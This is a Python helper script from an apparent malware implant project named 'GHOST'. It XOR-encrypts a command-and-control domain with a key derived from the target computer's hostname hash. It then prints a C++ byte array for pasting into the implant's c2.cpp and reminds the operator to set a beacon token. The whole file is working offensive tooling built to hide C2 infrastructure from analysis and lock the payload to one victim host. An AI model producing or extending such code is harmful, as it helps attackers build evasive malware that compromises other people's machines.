"""
GHOST Domain Encryptor
----------------------
Generates the XOR-encrypted C2 domain bytes for config in c2.cpp.

Usage:
    python encrypt_domain.py <domain> <hostname>

Example:
    python encrypt_domain.py ghost-c2.example.workers.dev DESKTOP-LAB

    This outputs the C++ byte array you paste into c2.cpp:
        const uint8_t C2_DOMAIN_ENCRYPTED[] = {0xAB, 0xCD, ...};
        const size_t  C2_DOMAIN_LEN = 35;

The hostname is the TARGET machine's computer name — the implant derives
the XOR key from its own hostname at runtime, so the encrypted bytes are
only valid for that specific host (or any host with the same name).
"""

import sys
import struct


def fnv1a_32(data: bytes) -> int:
    """FNV-1a 32-bit hash — must match the C++ implementation in utils.cpp."""
    h = 0x811C9DC5
    for b in data:
        h ^= b
        h = (h * 0x01000193) & 0xFFFFFFFF
    return h


def hostname_hash_key(hostname: str) -> str:
    """
    Replicate what GetHostnameHash() does in utils.cpp:
    FNV-1a over the UTF-16LE code units, returned as 8-char hex.
    """
    # GetComputerNameW returns UTF-16LE code units
    # FNV-1a in C++ iterates over wchar_t values (uint16_t on Windows)
    code_units = []
    for ch in hostname:
        code_units.append(ord(ch) & 0xFFFF)

    h = 0x811C9DC5
    for cu in code_units:
        h ^= cu & 0xFFFFFFFF
        h = (h * 0x01000193) & 0xFFFFFFFF

    return f"{h:08x}"


def xor_encrypt(plaintext: bytes, key: bytes) -> bytes:
    """XOR cipher with repeating key — matches XorBuffer() in utils.cpp."""
    if not key:
        return plaintext
    return bytes(p ^ key[i % len(key)] for i, p in enumerate(plaintext))


def main():
    if len(sys.argv) < 3:
        print("Usage: python encrypt_domain.py <domain> <hostname>")
        print("Example: python encrypt_domain.py ghost-c2.example.workers.dev DESKTOP-LAB")
        sys.exit(1)

    domain = sys.argv[1]
    hostname = sys.argv[2].upper()  # GetComputerNameW returns uppercase

    # The C++ code does:
    #   1. GetHostnameHash() → FNV-1a of hostname code units → "a1b2c3d4"
    #   2. WStringToUTF8(hash) → "a1b2c3d4" (ASCII, so UTF-8 == raw bytes)
    #   3. XorBuffer(domain_bytes, key_bytes)
    hash_hex = hostname_hash_key(hostname)
    key_bytes = hash_hex.encode("utf-8")  # 8 bytes: the hex string as ASCII

    print(f"[*] Domain:        {domain}")
    print(f"[*] Hostname:      {hostname}")
    print(f"[*] Hostname hash: {hash_hex}")
    print(f"[*] XOR key bytes: {key_bytes.hex()}")
    print()

    # Domain is stored as UTF-8 bytes (plain ASCII for domains)
    domain_bytes = domain.encode("utf-8")
    encrypted = xor_encrypt(domain_bytes, key_bytes)

    # Format as C++ byte array
    hex_values = ", ".join(f"0x{b:02X}" for b in encrypted)

    print("// ── Paste this into c2.cpp ──────────────────────────────")
    print(f"const uint8_t C2_DOMAIN_ENCRYPTED[] = {{{hex_values}}};")
    print(f"const size_t  C2_DOMAIN_LEN = {len(encrypted)};")
    print()

    # Verify roundtrip
    decrypted = xor_encrypt(encrypted, key_bytes)
    assert decrypted == domain_bytes, "Roundtrip failed!"
    print(f"[+] Verified: decrypts back to \"{decrypted.decode('utf-8')}\"")
    print()

    # Also show what to set for the beacon token
    print("// ── Don't forget to also set the beacon token ──────────")
    print(f"const wchar_t* BEACON_TOKEN = L\"<your_beacon_token_here>\";")


if __name__ == "__main__":
    main()
